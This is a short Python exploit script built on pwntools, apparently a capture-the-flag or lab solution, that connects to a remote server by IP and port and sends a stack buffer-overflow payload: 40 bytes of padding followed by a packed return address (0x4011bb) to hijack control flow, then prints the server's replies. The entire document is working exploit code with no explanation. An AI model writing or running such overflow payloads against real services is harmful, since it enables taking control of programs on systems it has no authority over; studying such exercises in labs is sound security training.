
from pwn import *

r = remote("130.192.5.212", 1951)

r.recvline()

line = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + b'bbbbbbbb' + p64(0x4011bb)

r.sendline(line)


print(r.recvline())
print(r.recvline())